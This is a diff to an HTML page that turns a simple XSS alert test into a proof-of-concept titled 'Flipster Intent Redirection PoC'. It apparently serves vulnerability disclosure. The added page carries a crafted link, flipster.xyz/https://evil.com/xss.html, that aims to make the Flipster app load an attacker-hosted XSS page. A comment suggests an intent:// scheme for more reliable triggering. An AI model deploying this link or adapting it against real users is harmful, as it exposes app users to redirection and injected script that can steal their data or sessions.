@@ -1,8 +1,18 @@
+<!DOCTYPE html>
 <html>
+<head>
+    <title>Flipster PoC</title>
+</head>
 <body>
-<h1 id="result">XSS</h1>
-<script>
-alert("XSS");
-</script>
+    <h2>Flipster Intent Redirection PoC</h2>
+    <p>Click the link below on a device with Flipster installed:</p>
+
+    <a href="https://flipster.xyz/https://evil.com/xss.html">
+        Open in Flipster
+    </a>
+
+    <br><br>
+
+    <!-- Alternative: intent:// scheme for more reliable triggering -->
 </body>
 </html>
